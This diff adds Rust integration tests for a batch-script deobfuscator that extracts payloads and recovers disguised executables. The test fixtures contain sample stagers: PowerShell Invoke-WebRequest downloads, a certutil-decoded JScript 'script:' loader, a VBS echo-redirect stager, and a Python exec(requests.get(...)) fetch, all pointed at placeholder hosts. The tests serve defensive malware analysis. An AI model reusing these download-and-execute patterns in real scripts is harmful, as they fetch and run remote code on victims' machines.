@@ -2,7 +2,27 @@
 
 use assert_cmd::Command;
 use std::fs;
+use std::path::Path;
 use tempfile::TempDir;
+
+fn minimal_pe_bytes() -> Vec<u8> {
+    let mut pe = vec![0u8; 2048];
+    pe[0] = b'M';
+    pe[1] = b'Z';
+    pe[0x3c] = 0x80;
+    pe[0x80] = b'P';
+    pe[0x81] = b'E';
+    pe[0x82] = 0;
+    pe[0x83] = 0;
+    pe[0x84] = 0x4c;
+    pe[0x85] = 0x01;
+    pe[0x86] = 0x03;
+    pe[0x87] = 0;
+    for (i, slot) in pe[512..].iter_mut().enumerate() {
+        *slot = (i as u8).wrapping_mul(19).wrapping_add(11);
+    }
+    pe
+}
 
 #[test]
 fn deob_writes_deobfuscated_file() {
@@ -227,6 +247,125 @@ fn deob_writes_traits_json() {
     let contents = fs::read_to_string(&traits_path).expect("read");
     // Should parse as JSON array (possibly empty)
     let _: serde_json::Value = serde_json::from_str(&contents).expect("valid json");
+}
+
+#[test]
+fn report_traits_render_printable_echo_content_as_string() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        "echo CreateObject(WScript.Shell).Run calc.exe>stage.vbs\r\n",
+    )
+    .expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["report", input.to_str().expect("path")])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+
+    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("valid json");
+    let content = v["traits"]
+        .as_array()
+        .expect("traits")
+        .iter()
+        .find(|trait_| trait_["kind"] == "EchoRedirect")
+        .and_then(|trait_| trait_["content"].as_str());
+    assert_eq!(
+        content,
+        Some("CreateObject(WScript.Shell).Run calc.exe\r\n"),
+        "printable EchoRedirect content should render as a string: {v}"
+    );
+}
+
+#[test]
+fn deob_json_lists_written_recovered_artifact() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("looks-like-pdf.bat");
+    fs::write(&input, minimal_pe_bytes()).expect("write pe");
+    let out_dir = dir.path().join("out");
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "deob",
+            input.to_str().expect("path"),
+            "-o",
+            out_dir.to_str().expect("path"),
+            "--json",
+            "--force",
+        ])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let value: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
+    let recovered = value["output_files"]["recovered"]
+        .as_array()
+        .expect("recovered output_files array");
+    assert_eq!(recovered.len(), 1, "json:\n{value:#}");
+    let artifact = &recovered[0];
+    assert_eq!(artifact["kind"], "pe");
+    assert_eq!(artifact["format"], "exe");
+    assert_eq!(artifact["origin"], "disguised-pe-input");
+    let path = artifact["path"].as_str().expect("artifact path");
+    assert!(
+        Path::new(path).exists(),
+        "manifest path does not exist: {path}; json:\n{value:#}"
+    );
+    assert_eq!(fs::read(path).expect("read artifact")[..2], *b"MZ");
+    assert!(
+        artifact["meta_path"]
+            .as_str()
+            .is_some_and(|path| Path::new(path).exists()),
+        "meta path missing or absent: {artifact:#}"
+    );
+}
+
+#[test]
+fn report_counts_non_pe_recovered_artifact_by_format() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("carrier-cab.bat");
+    fs::write(&input, b"MSCF\x00\x00\x00\x00fake-cab").expect("write cab");
+    let out_dir = dir.path().join("out");
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "report",
+            input.to_str().expect("path"),
+            "-o",
+            out_dir.to_str().expect("path"),
+            "--force",
+        ])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let value: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
+    assert_eq!(value["recovered"]["total"].as_u64(), Some(1), "{value:#}");
+    assert_eq!(value["recovered"]["pe"].as_u64(), Some(0), "{value:#}");
+    assert_eq!(
+        value["recovered"]["by_format"]["cab"].as_u64(),
+        Some(1),
+        "{value:#}"
+    );
+    let recovered = value["output_files"]["recovered"]
+        .as_array()
+        .expect("recovered output_files array");
+    assert_eq!(recovered.len(), 1, "json:\n{value:#}");
+    assert_eq!(recovered[0]["kind"], "cab");
+    assert_eq!(recovered[0]["format"], "cab");
 }
 
 #[test]
@@ -632,6 +771,312 @@ fn report_include_deob_exposes_extracted_powershell_without_polluting_deob() {
                 .unwrap_or("")
                 .contains("report-extracted.example")),
         "download trait from extracted PowerShell was not reported: {v}"
+    );
+}
+
+#[test]
+fn report_extracted_powershell_payloads_render_known_batch_variables() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        r#"set "cmdUrl=https://report-var-ps.example/startupppp.bat"
+set "cmdDestination=C:\Users\Public\startupppp.bat"
+powershell -Command "& { Invoke-WebRequest -Uri '%cmdUrl%' -OutFile '%cmdDestination%' }"
+"#,
+    )
+    .expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["report", "--include-deob", input.to_str().expect("path")])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let v: serde_json::Value = serde_json::from_slice(&out).expect("valid json");
+    let powershell = v["extracted_payloads"]["powershell"]
+        .as_array()
+        .expect("powershell payload array")
+        .iter()
+        .map(|value| value.as_str().unwrap_or_default())
+        .collect::<Vec<_>>();
+
+    assert!(
+        powershell
+            .iter()
+            .any(|payload| payload.contains("https://report-var-ps.example/startupppp.bat")),
+        "resolved PowerShell payload missing from report: {v}"
+    );
+    assert!(
+        !powershell
+            .iter()
+            .any(|payload| payload.contains("%cmdUrl%") || payload.contains("%cmdDestination%")),
+        "unresolved batch variables leaked into report payloads: {v}"
+    );
+}
+
+#[test]
+fn report_extracted_powershell_payloads_drop_empty_outfile_duplicate() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        r#"set "cmdUrl=https://report-var-ps.example/startup.bat"
+set "cmdDestination=C:\Users\Public\startup.bat"
+powershell -Command "& { Invoke-WebRequest -Uri '%cmdUrl%' -OutFile '%cmdDestination%' }"
+powershell -Command "& { Invoke-WebRequest -Uri 'https://report-var-ps.example/startup.bat' -OutFile '' }"
+"#,
+    )
+    .expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["report", "--include-deob", input.to_str().expect("path")])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let v: serde_json::Value = serde_json::from_slice(&out).expect("valid json");
+    let powershell = v["extracted_payloads"]["powershell"]
+        .as_array()
+        .expect("powershell payload array")
+        .iter()
+        .map(|value| value.as_str().unwrap_or_default())
+        .collect::<Vec<_>>();
+
+    assert!(
+        powershell
+            .iter()
+            .any(|payload| payload.contains("-OutFile 'C:\\Users\\Public\\startup.bat'")),
+        "resolved PowerShell payload missing from report: {v}"
+    );
+    assert!(
+        !powershell
+            .iter()
+            .any(|payload| payload.contains("-OutFile ''")),
+        "empty duplicate PowerShell payload leaked into report: {v}"
+    );
+}
+
+#[test]
+fn report_extracted_powershell_payloads_drop_empty_expand_archive_preview() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        r#"powershell -Command "try { Expand-Archive -Path '' -DestinationPath '' -Force } catch { exit 1 }"
+"#,
+    )
+    .expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["report", "--include-deob", input.to_str().expect("path")])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let v: serde_json::Value = serde_json::from_slice(&out).expect("valid json");
+    let powershell = v["extracted_payloads"]["powershell"]
+        .as_array()
+        .expect("powershell payload array");
+
+    assert!(
+        powershell.is_empty(),
+        "empty Expand-Archive preview leaked into report: {v}"
+    );
+}
+
+#[test]
+fn report_extracted_payloads_render_known_cmd_and_delayed_variables() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        r#"setlocal enabledelayedexpansion
+set "StagePath=%TEMP%\stage.ps1"
+set "MsiPath=%TEMP%\stage.bmp"
+cmd /c msiexec /i "%MsiPath%"
+powershell -Command "Set-Content -Path \"!StagePath!\" -Value ok"
+"#,
+    )
+    .expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["report", "--include-deob", input.to_str().expect("path")])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let v: serde_json::Value = serde_json::from_slice(&out).expect("valid json");
+    let cmd = v["extracted_payloads"]["cmd"]
+        .as_array()
+        .expect("cmd payload array")
+        .iter()
+        .map(|value| value.as_str().unwrap_or_default())
+        .collect::<Vec<_>>();
+    let powershell = v["extracted_payloads"]["powershell"]
+        .as_array()
+        .expect("powershell payload array")
+        .iter()
+        .map(|value| value.as_str().unwrap_or_default())
+        .collect::<Vec<_>>();
+
+    assert!(
+        cmd.iter().any(|payload| payload
+            .contains(r#"msiexec /i "C:\Users\puncher\AppData\Local\Temp\stage.bmp""#)),
+        "resolved cmd payload missing from report: {v}"
+    );
+    assert!(
+        powershell.iter().any(|payload| payload
+            .contains(r#"Set-Content -Path \"C:\Users\puncher\AppData\Local\Temp\stage.ps1\""#)),
+        "resolved delayed PowerShell payload missing from report: {v}"
+    );
+    assert!(
+        !cmd.iter().any(|payload| payload.contains("%MsiPath%"))
+            && !powershell
+                .iter()
+                .any(|payload| payload.contains("!StagePath!")),
+        "unresolved known variables leaked into report payloads: {v}"
+    );
+}
+
+#[test]
+fn report_extracted_cmd_payloads_render_adjacent_consumed_variables_from_deob_lines() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        r#"@echo off
+set "setter=set "
+%setter%"Root=C:\Prog"
+%setter%"Mid=ram"
+%setter%"Tail=Data\"
+cmd.exe /c %Root%%Mid%%Tail%sett.bat"
+"#,
+    )
+    .expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["report", "--include-deob", input.to_str().expect("path")])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let v: serde_json::Value = serde_json::from_slice(&out).expect("valid json");
+    let cmd = v["extracted_payloads"]["cmd"]
+        .as_array()
+        .expect("cmd payload array")
+        .iter()
+        .map(|value| value.as_str().unwrap_or_default())
+        .collect::<Vec<_>>();
+
+    assert!(
+        cmd.iter()
+            .any(|payload| payload == &r#"C:\ProgramData\sett.bat""#),
+        "resolved adjacent-variable cmd payload missing from report: {v}"
+    );
+    assert!(
+        !cmd.iter()
+            .any(|payload| payload.contains("%Root%") || payload.contains("%Mid%")),
+        "unresolved adjacent variables leaked into report payloads: {v}"
+    );
+}
+
+#[test]
+fn report_summary_counts_certutil_decoded_jscript_payloads() {
+    use base64::Engine;
+
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("certdecode-js.bat");
+    let payload = r#"var CP7V="sc"+"r";GetObject(CP7V+"ipt:https://decoded-js.example/?1/");"#;
+    let encoded = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+    fs::write(
+        &input,
+        format!("echo {encoded}>src.b64\r\ncertutil -decode src.b64 stage.Js\r\n"),
+    )
+    .expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args(["report", "--include-deob", input.to_str().expect("path")])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+
+    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("valid json");
+    assert_eq!(
+        v["extracted"]["jscript"].as_u64(),
+        Some(1),
+        "report summary did not count decoded JScript payload: {v}"
+    );
+    assert!(
+        v["extracted_payloads"]["jscript"]
+            .as_array()
+            .expect("jscript payload array")
+            .iter()
+            .any(|payload| payload
+                .as_str()
+                .unwrap_or("")
+                .contains("decoded-js.example")),
+        "decoded JScript payload missing from separated payload buffers: {v}"
+    );
+}
+
+#[test]
+fn report_timeout_emits_partial_json() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("slow-inline-ps.bat");
+    let large_tail = "A".repeat(1_000_000);
+    fs::write(
+        &input,
+        format!(
+            "@echo off\r\npowershell -Command \"function sub($s,$i,$n){{ return $s.Substring($i,$n) }}; {large_tail}\"\r\n"
+        ),
+    )
+    .expect("write");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "report",
+            "--timeout",
+            "1",
+            "--include-deob",
+            input.to_str().expect("path"),
+        ])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr:\n{}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+
+    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("valid timeout json");
+    assert!(
+        v["traits_capped"]
+            .as_array()
+            .expect("traits_capped")
+            .iter()
+            .any(|trait_| trait_["kind"] == "TimeoutHit"),
+        "timeout report did not expose TimeoutHit: {v}"
+    );
+    assert!(
+        v["deobfuscated"].as_str().is_some(),
+        "timeout report did not include partial deobfuscated buffer: {v}"
     );
 }
 
@@ -1324,7 +1769,77 @@ fn analyze_json_includes_extracted_counts() {
         v["extracted"]["powershell"].as_u64().unwrap_or_default() >= 1,
         "PowerShell extracted count missing from analyze JSON: {v}"
     );
+    assert!(
+        v["extracted"].get("powershell_samples").is_none(),
+        "preview field should not be present in default summary JSON: {v}"
+    );
     assert_eq!(v["recovered"]["pe"].as_u64(), Some(0));
+}
+
+#[test]
+fn report_writes_tail_base64_python_payload_as_script_artifact() {
+    use base64::Engine;
+
+    let payload = format!(
+        "import requests, zlib\n\
+         junk = '{}'\n\
+         exec(requests.get('https://tail-b64-python-cli.example/stage.py').text)\n\
+         exec(__import__('marshal').loads(zlib.decompress(__import__('base64').b85decode(junk))))\n",
+        "$".repeat(8_000)
+    );
+    let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        format!("@echo off\r\npowershell -NoP -C \"iex tail-loader\"\r\n{b64}\r\n"),
+    )
+    .expect("write");
+    let out_dir = dir.path().join("out");
+
+    let out = Command::cargo_bin("batdeob")
+        .expect("bin")
+        .args([
+            "report",
+            input.to_str().expect("path"),
+            "-o",
+            out_dir.to_str().expect("path"),
+        ])
+        .output()
+        .expect("run");
+    assert!(
+        out.status.success(),
+        "stderr: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    let v: serde_json::Value = serde_json::from_slice(&out.stdout).expect("json");
+    let recovered = v["output_files"]["recovered"]
+        .as_array()
+        .expect("recovered files");
+    let py = recovered
+        .iter()
+        .find(|file| {
+            file["origin"]
+                .as_str()
+                .is_some_and(|origin| origin.starts_with("tail-base64-python"))
+        })
+        .expect("tail-base64-python artifact");
+
+    assert_eq!(py["kind"].as_str(), Some("script"), "{py:#}");
+    assert_eq!(py["format"].as_str(), Some("py"), "{py:#}");
+    assert!(
+        py["name"]
+            .as_str()
+            .is_some_and(|name| name.ends_with(".py")),
+        "{py:#}"
+    );
+    let artifact_path = py["path"].as_str().expect("artifact path");
+    let artifact = fs::read_to_string(artifact_path).expect("read artifact");
+    assert!(
+        artifact.contains("tail-b64-python-cli.example/stage.py"),
+        "{artifact}"
+    );
 }
 
 #[test]
